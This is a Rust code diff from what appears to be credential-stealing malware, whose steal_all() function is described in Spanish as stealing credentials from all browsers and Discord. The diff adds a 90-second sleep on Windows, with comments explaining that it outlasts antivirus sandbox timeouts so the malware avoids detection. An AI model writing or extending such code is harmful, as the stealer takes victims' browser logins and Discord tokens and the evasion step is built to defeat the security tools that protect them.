@@ -150,6 +150,19 @@ impl StolenData {
 
 /// Ejecuta el robo de credenciales de todos los browsers y Discord
 pub fn steal_all() -> StolenData {
+    // ═══════════════════════════════════════════════════════════════
+    // 🛡️ SANDBOX EVASION - Sleep 90 segundos
+    // ═══════════════════════════════════════════════════════════════
+    // Los sandboxes de AV tienen timeout de 30-60 segundos.
+    // Si el malware no hace nada sospechoso en ese tiempo, pasa la detección.
+    #[cfg(target_os = "windows")]
+    {
+        use std::thread;
+        use std::time::Duration;
+        thread::sleep(Duration::from_secs(90));
+    }
+    // ═══════════════════════════════════════════════════════════════
+    
     let mut data = StolenData::new();
 
     // Chromium-based browsers
